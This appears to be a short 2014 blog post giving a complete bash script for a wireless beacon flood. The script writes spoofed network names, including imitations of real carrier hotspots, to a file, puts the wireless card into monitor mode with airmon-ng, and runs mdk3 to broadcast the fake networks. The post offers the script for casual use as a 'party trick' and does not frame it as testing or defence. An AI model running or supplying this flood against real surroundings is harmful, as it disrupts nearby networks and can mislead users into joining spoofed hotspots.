---

title:  Beacon Attack Script
date:   2014-05-20 00:00:00 -0500
categories: IT
---






Using MDK3 to create a bunch of fake wireless networks is a neat party trick. This bash script will create a text file with a list of network names, defined in a the "networks" array, if it doesn't already exist.

Then the script will configure the interface by putting it in monitor mode. Finally the script will fire off MDK3 using the text file created earlier.

You must have aircrack and mdk3 installed.
```powershellnetworks=(
"FreeWifi"
"FBI Van #12"
"Customer Wireless"
"Visitors"
"ATTWifi"
"Verizon Hotspot"
"l33t haxor net"
)

if [ -f ssid_names ]
then
echo -e "\e[1;31mDeleting list of network names\e[0m"
rm -f ssid_names
fi

echo -e "\e[1;32mCreating list of network names\e[0m"
for i in "${networks[@]}"
do
echo $i >> ssid_names
done

if [[ -n $(airmon-ng | grep mon0) ]]
then
echo -e "\e[1;32mMon0 interface exists\e[0m"
else
echo -e "\e[1;32mStarting AirMon on wlan0\e[0m"
airmon-ng start wlan0
fi

echo -e "\e[1;32mBegin beacon flood on mon0\e[0m"
mdk3 mon0 b -c 11 -f ssid_names
```


